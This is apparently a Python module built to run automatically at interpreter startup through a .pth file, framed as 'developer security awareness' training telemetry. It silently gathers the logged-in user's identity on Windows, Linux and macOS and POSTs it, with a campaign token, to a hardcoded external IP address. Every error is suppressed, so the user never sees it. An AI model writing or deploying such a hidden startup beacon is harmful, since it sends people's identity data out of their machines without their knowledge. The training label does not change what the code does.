
import getpass
import json
import os
import sys
import urllib.request
import urllib.error
from datetime import datetime

# Configuration via environment variables with defaults
CALLBACK_URL = os.environ.get(
    'RACMORPH_CALLBACK_URL',
    'http://152.42.160.210:7788/api/callback',
)
CAMPAIGN_ID = os.environ.get('RACMORPH_CAMPAIGN_ID', 'DEV-OCT-2026')
CAMPAIGN_TOKEN = os.environ.get('RACMORPH_CAMPAIGN_TOKEN', 'CHANGE-ME')

# EXTENDED_NAME_FORMAT: NameSamCompatible (DOMAIN\username)
_NAME_SAM_COMPATIBLE = 2
_MYANMAR_TZ = "Asia/Yangon"


def _detect_platform():
    """Return a simple trainer label: windows, linux, darwin, or unknown."""

    if sys.platform == "win32" or os.name == "nt":
        return "windows"
    if sys.platform.startswith("linux"):
        return "linux"
    if sys.platform == "darwin":
        return "darwin"
    return "unknown"


def _simple_username():
    try:
        name = getpass.getuser()
        if name:
            return name
    except Exception:
        pass
    return "unknown"


def _event_time_mmt():
    """
    Trainer-readable date and time in Myanmar Time.

    Uses IANA zone Asia/Yangon via zoneinfo (not a hardcoded UTC offset).
    """

    try:
        try:
            from zoneinfo import ZoneInfo
        except ImportError:
            from backports.zoneinfo import ZoneInfo

        try:
            import tzdata  # noqa: F401 — supplies IANA data on Windows
        except ImportError:
            pass

        now = datetime.now(ZoneInfo(_MYANMAR_TZ))
        return now.strftime("%Y-%m-%d %H:%M:%S MMT (Asia/Yangon)")
    except Exception:
        return "unavailable"


def _get_windows_extended_username():
    """
    Windows only: extended username from GetUserNameExW (secur32).

    Other operating systems skip this call and return None. Failures never raise.
    """

    if _detect_platform() != "windows":
        return None

    try:
        import ctypes

        secur32 = ctypes.WinDLL("secur32", use_last_error=True)
        GetUserNameExW = secur32.GetUserNameExW
        GetUserNameExW.argtypes = [
            ctypes.c_int,
            ctypes.c_wchar_p,
            ctypes.POINTER(ctypes.c_ulong),
        ]
        GetUserNameExW.restype = ctypes.c_int

        size = ctypes.c_ulong(1024)
        buffer = ctypes.create_unicode_buffer(size.value)
        if not GetUserNameExW(_NAME_SAM_COMPATIBLE, buffer, ctypes.byref(size)):
            return None
        name = buffer.value
        if not name:
            return None
        return name
    except Exception:
        return None


def _linux_login_identity():
    """Linux only: login name from pwd.getpwuid. Other OSes skip this."""

    if _detect_platform() != "linux":
        return None

    try:
        import pwd

        name = pwd.getpwuid(os.getuid()).pw_name
        if name:
            return name
    except Exception:
        pass
    return None


def _macos_console_user():
    """macOS console user via SystemConfiguration. Returns None on failure."""

    try:
        import ctypes
        import ctypes.util

        sc_path = ctypes.util.find_library("SystemConfiguration")
        cf_path = ctypes.util.find_library("CoreFoundation")
        if not sc_path or not cf_path:
            return None

        sc = ctypes.CDLL(sc_path)
        cf = ctypes.CDLL(cf_path)

        sc.SCDynamicStoreCopyConsoleUser.argtypes = [
            ctypes.c_void_p,
            ctypes.c_void_p,
            ctypes.c_void_p,
        ]
        sc.SCDynamicStoreCopyConsoleUser.restype = ctypes.c_void_p

        cf.CFStringGetCString.argtypes = [
            ctypes.c_void_p,
            ctypes.c_char_p,
            ctypes.c_long,
            ctypes.c_uint32,
        ]
        cf.CFStringGetCString.restype = ctypes.c_bool
        cf.CFRelease.argtypes = [ctypes.c_void_p]

        kCFStringEncodingUTF8 = 0x08000100
        cf_str = sc.SCDynamicStoreCopyConsoleUser(None, None, None)
        if not cf_str:
            return None
        try:
            buf = ctypes.create_string_buffer(256)
            if not cf.CFStringGetCString(cf_str, buf, 256, kCFStringEncodingUTF8):
                return None
            name = buf.value.decode("utf-8")
            if name:
                return name
        finally:
            cf.CFRelease(cf_str)
    except Exception:
        pass
    return None


def _macos_login_identity():
    """macOS only: console user, then pwd.getpwuid. Other OSes skip this."""

    if _detect_platform() != "darwin":
        return None

    name = _macos_console_user()
    if name:
        return name

    try:
        import pwd

        name = pwd.getpwuid(os.getuid()).pw_name
        if name:
            return name
    except Exception:
        pass
    return None


def collect_training_telemetry():
    """
    Detect OS first, then collect ONLY identity for follow-up training:

      - windows: GetUserNameExW (extended_username) + username fallback
      - linux: pwd.getpwuid login name
      - darwin: console user / pwd.getpwuid login name

    Also includes a simple platform label and a Myanmar-time event stamp.
    No hostname, IP, MAC, processes, files, clipboard, keystrokes,
    environment variables, credentials, or other host inventory.
    """

    platform = _detect_platform()

    payload = {
        "campaign_id": CAMPAIGN_ID,
        "campaign_token": CAMPAIGN_TOKEN,
        "event": "training_package_executed",
        "platform": platform,
        "event_time_mmt": _event_time_mmt(),
    }

    if platform == "windows":
        payload["username"] = _simple_username()
        extended_username = _get_windows_extended_username()
        if extended_username:
            payload["extended_username"] = extended_username
    elif platform == "linux":
        payload["username"] = _linux_login_identity() or _simple_username()
    elif platform == "darwin":
        payload["username"] = _macos_login_identity() or _simple_username()
    else:
        payload["username"] = _simple_username()

    return payload


def send_training_event():
    """
    Send the limited training telemetry to the controlled collector.
    """

    if not CALLBACK_URL or "YOUR-CONTROLLED-DOMAIN" in CALLBACK_URL:
        return

    telemetry = collect_training_telemetry()

    body = json.dumps(telemetry).encode("utf-8")

    request = urllib.request.Request(
        CALLBACK_URL,
        data=body,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Developer-Security-Awareness-Simulation/1.0",
        },
        method="POST",
    )

    try:
        with urllib.request.urlopen(request, timeout=5) as response:
            response.read(1024)

    except (urllib.error.URLError, urllib.error.HTTPError, TimeoutError):
        # Training telemetry should never break Python startup.
        pass
    except Exception:
        pass


# Execute when imported by the .pth mechanism.
send_training_event()
